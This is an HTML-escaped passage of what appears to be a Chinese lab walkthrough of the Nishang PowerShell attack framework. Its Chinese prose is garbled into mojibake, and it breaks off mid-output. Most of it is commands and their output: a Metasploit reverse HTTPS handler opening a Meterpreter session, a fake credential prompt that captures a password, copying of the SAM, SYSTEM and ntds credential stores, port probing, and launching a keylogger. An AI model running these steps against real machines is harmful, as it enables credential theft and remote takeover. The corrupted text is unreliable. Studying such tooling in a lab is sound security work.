&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; run
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started HTTPS reverse handler on https://172.16.0.107:4444
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://172.16.0.107:4444 handling request from 172.16.0.106&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;UUID: j1druwho&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Without a database connected that payload UUID tracking will not work!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://172.16.0.107:4444 handling request from 172.16.0.106&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;UUID: j1druwho&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Staging x64 payload &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;201308&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://172.16.0.107:4444 handling request from 172.16.0.106&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;UUID: j1druwho&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Without a database connected that payload UUID tracking will not work!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Meterpreter session &lt;span class=&#34;m&#34;&gt;13&lt;/span&gt; opened &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;172.16.0.107:4444 -&amp;gt; 127.0.0.1 &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2022-01-23 00:51:04 +0800
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;meterpreter &amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ¬æ¥æƒ³æ”¾å¼ƒäº†ï¼Œä½†æ˜¯åˆå¿ä¸ä½å»å¼„ï¼Œç»“æœä¸å°å¿ƒå°±æˆåŠŸäº†ï½ï¼ŒåšæŠ€æœ¯è¿˜æ˜¯ä¸è¦é‚£ä¹ˆæµ®èºæ‰å¥½ã€‚&lt;/p&gt;
&lt;h1 id=&#34;nishang&#34;&gt;Nishang&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;Nishang&lt;/code&gt;æ˜¯ä¸€ä¸ªåŸºäº&lt;code&gt;PowerShell&lt;/code&gt;æ”»å‡»è„šæœ¬å’Œæœ‰æ•ˆè½½è·çš„æ¡†æ¶å’Œé›†åˆï¼Œæ”¯æŒä½¿ç”¨&lt;code&gt;PowerShell&lt;/code&gt;è¿›è¡Œæ”»å‡»æ€§å®‰å…¨ã€æ¸—é€æµ‹è¯•å’Œçº¢é˜Ÿåˆä½œï¼Œé›†æˆäº†æ¡†æ¶ã€è„šæœ¬å’Œå„ç§payloadï¼ˆåŒ…æ‹¬ä¸‹è½½ã€æ‰§è¡Œã€åé—¨ã€æ‰«æã€æ‰§è¡Œã€è§£å¯†ã€é”®ç›˜è®°å½•ç­‰è„šæœ¬ï¼‰ï¼Œè¢«å¹¿æ³›ç”¨äºæ¸—é€æµ‹è¯•çš„å„ä¸ªé˜¶æ®µã€‚&lt;/p&gt;
&lt;h2 id=&#34;å®‰è£…-2&#34;&gt;å®‰è£…&lt;/h2&gt;
&lt;p&gt;ä¸‹è½½é“¾æ¥ï¼šhttps://github.com/samratashok/nishang&lt;/p&gt;
&lt;p&gt;å¯ä»¥ä½¿ç”¨gitä¸‹è½½åˆ°ç›®æ ‡æœºå™¨ä¸Šï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/samratashok/nishang.git
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¹Ÿå¯ä»¥ç›´æ¥ä¸‹è½½zipåŒ…ï¼Œç„¶ååœ¨ç›®æ ‡æœºå™¨ä¸Šè§£å‹å³å¯ã€‚&lt;/p&gt;
&lt;p&gt;æµ‹è¯•çš„ç¯å¢ƒæœ€å¥½æ˜¯åœ¨Windows 7ä»¥ä¸Šï¼Œå› ä¸ºNishangæ˜¯æ”¯æŒpowershell 3.0ä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œæ‰€ä»¥æœ€å¥½æ˜¯åœ¨Windows 10æˆ–è€…æ˜¯Windows 2012 ä»¥ä¸Šçš„ç³»ç»Ÿã€‚&lt;/p&gt;
&lt;p&gt;æ‰“å¼€Powershellï¼Œè¾“å…¥ä¸€ä¸‹å‘½ä»¤å³å¯å¯¼å…¥æ¨¡å—ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Import-Module .\nishang.psm1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;å¦‚æœç³»ç»Ÿç¦æ­¢æ‰§è¡Œå¯ä»¥å…ˆè®¾ç½®å‘½ä»¤ Set-ExecutionPolicy UnRestricted&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æˆ‘ä»¬æ¥çœ‹ä¸‹Nishangæ¨¡å—çš„ç›®å½•ä»‹ç»ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ActiveDirectoryï¼šæ´»åŠ¨ç›®å½•
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Antak-WebShellï¼šåœ¨å†…å­˜ä¸­æ‰§è¡ŒPowerShellè„šæœ¬ï¼Œè¿è¡Œå‘½ä»¤ï¼Œå¹¶ä½¿ç”¨æ­¤Webshellä¸‹è½½å’Œä¸Šè½½æ–‡ä»¶ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Backdoorsï¼šä¸€ä¸ªåé—¨ï¼Œå¯ä»¥ä»ç¬¬ä¸‰æ–¹ç½‘ç«™æ¥æ”¶æŒ‡ä»¤ï¼Œå¹¶åœ¨å†…å­˜ä¸­æ‰§è¡ŒPowerShellè„šæœ¬ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Bypassï¼šå®æ–½å…¬å…±å·²çŸ¥æ–¹æ³•æ¥ç»•è¿‡
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Clientï¼šå®¢æˆ·ç«¯
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Escalationï¼šå½“éœ€è¦æƒé™æ—¶ææƒ
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Executionï¼šå‘½ä»¤æ‰§è¡Œ(RCE)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Gatherï¼šä¿¡æ¯æ”¶é›†
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;MITMï¼šç”¨äºMITMæ”»å‡»çš„æœ¬åœ°HTTPSä»£ç†
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Miscï¼šè„šæœ¬
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Pivotï¼šè·³æ¿ã€è¿œç¨‹æ‰§è¡Œexe
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Prasadhakï¼šå¯¹ç…§VirusTotalæ•°æ®åº“æ£€æŸ¥æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹çš„è¿è¡Œå“ˆå¸Œã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Scanï¼šæ‰«æ
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Shellsï¼šshell
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Utilityï¼šæ‚é¡¹
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Powerpreterï¼šMeterpreterä¼šè¯
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;nishangæ¨¡å—æ”»å‡»å®æˆ˜&#34;&gt;Nishangæ¨¡å—æ”»å‡»å®æˆ˜&lt;/h2&gt;
&lt;h3 id=&#34;check-vm&#34;&gt;Check-VM&lt;/h3&gt;
&lt;p&gt;æˆ‘ä»¬åªè¦æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯çŸ¥é“æœ¬æœºæ˜¯å¦æ˜¯è™šæ‹Ÿæœºï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Check-VM&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;This&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Hyper-V&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;machine&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;This&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;VMWare&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;machine&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;invoke-credentialsphish&#34;&gt;Invoke-CredentialsPhish&lt;/h3&gt;
&lt;p&gt;è¿™ä¸ªè„šæœ¬æ˜¯ç”¨æ¥æ¬ºéª—ç›®æ ‡ä¸»æœºçš„ç”¨æˆ·ï¼Œè®©ç”¨æˆ·è¾“å…¥å¯†ç ï¼Œå¦‚æœä¸è¾“å…¥æ­£ç¡®çš„å¯†ç å°±ä¸å›å…³é—­å¯¹è¯æ¡†ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Invoke-CredentialsPhish&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Username&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;testuser&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Password&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;@ssw0rd&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Domain&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Domain&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hack&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;copy-vss&#34;&gt;Copy-VSS&lt;/h3&gt;
&lt;p&gt;å°±æ˜¯copyå‡­è¯çš„åŠŸèƒ½ï¼Œéœ€è¦æœ‰ç®¡ç†å‘˜æƒé™ï¼Œç›¸å…³çš„çŸ¥è¯†å¯ä»¥çœ‹ä¸‹é¢é“¾æ¥ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets&#34;&gt;https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds&#34;&gt;https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Copy-VSS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;å·²å¤åˆ¶&lt;/span&gt;         &lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ä¸ªæ–‡ä»¶&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;ã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;å·²å¤åˆ¶&lt;/span&gt;         &lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ä¸ªæ–‡ä»¶&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;ã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;å·²å¤åˆ¶&lt;/span&gt;         &lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ä¸ªæ–‡ä»¶&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;ã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;dir
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;----&lt;/span&gt;        &lt;span class=&#34;mf&#34;&gt;2022&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;18&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;17&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;39&lt;/span&gt;       &lt;span class=&#34;mf&#34;&gt;12582912&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ntds&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;-a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;----&lt;/span&gt;        &lt;span class=&#34;mf&#34;&gt;2016&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;16&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;21&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;25&lt;/span&gt;          &lt;span class=&#34;mf&#34;&gt;65536&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SAM&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;-a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;----&lt;/span&gt;        &lt;span class=&#34;mf&#34;&gt;2022&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;18&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;17&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;52&lt;/span&gt;       &lt;span class=&#34;mf&#34;&gt;16252928&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SYSTEM&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;firebuster-firelisteneræ‰«æå™¨&#34;&gt;FireBuster FireListeneræ‰«æå™¨&lt;/h3&gt;
&lt;p&gt;æ„Ÿè§‰å°±æ˜¯ä¸€ä¸ªç«¯å£æ‰«æï¼Œç”¨å¤„ä¸æ˜¯å¾ˆå¤§ï¼Œå°±æ˜¯ä¸€ç›´ç›‘å¬è¿™ç«¯å£æ˜¯å¦å¼€æ”¾ï¼š&lt;/p&gt;
&lt;p&gt;æ”»å‡»æœºï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PS C:\Users\test\Desktop\nishang-master&amp;gt; FireListener 3389-3390
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Listening on port 3389
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Listening on port 3390
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Listening on port 3389
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Listening on port 3389
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;172.16.0.106 connected through port 3390
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Listening on port 3390
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Listening on port 3389
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç›®æ ‡ä¸»æœºï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PS C:\Users\test\Desktop\nishang-master\nishang-master&amp;gt; FireBuster 172.16.0.106 3389-3390 -Verbose
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;è¯¦ç»†ä¿¡æ¯: Trying to connect to 172.16.0.106 from 3389 to 3390
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Sending....
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;è¯¦ç»†ä¿¡æ¯: Trying port 3389
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connected to port 3389
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;è¯¦ç»†ä¿¡æ¯: Trying port 3390
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connected to port 3390
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Data sent to all ports
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°3389å°±ç›®æ ‡ä¸»æœºå¼€æ”¾çš„ï¼Œä½†æ˜¯æŒ‰ä¹¦é‡Œæ¥çš„è¯3390æ˜¯è¢«åˆ¤å®šæ˜¯å¼€æ”¾çš„ã€‚ã€‚ã€‚&lt;/p&gt;
&lt;h3 id=&#34;keyloggeré”®ç›˜è®°å½•&#34;&gt;Keyloggeré”®ç›˜è®°å½•&lt;/h3&gt;
&lt;p&gt;è¿™ä¸ªé”®ç›˜è®°å½•å…·æœ‰è‡ªå®šä¹‰webæ¥æ§åˆ¶çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬å…ˆæ¥ç›´æ¥å¯¼å…¥keylogæ–‡ä»¶çœ‹çœ‹,æç¤ºè¾“å…¥å°±æŒ‰ç©ºæ ¼å³å¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PS C:\Users\test\Desktop\nishang-master\nishang-master&amp;gt; .\Gather\Keylogger.ps1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ä½äºå‘½ä»¤ç®¡é“ä½ç½® 1 çš„ cmdlet Keylogger.ps1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;è¯·ä¸ºä»¥ä¸‹å‚æ•°æä¾›å€¼:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CheckURL:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;MagicString:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Id     Name            PSJobTypeName   State         HasMoreData     Location             Command
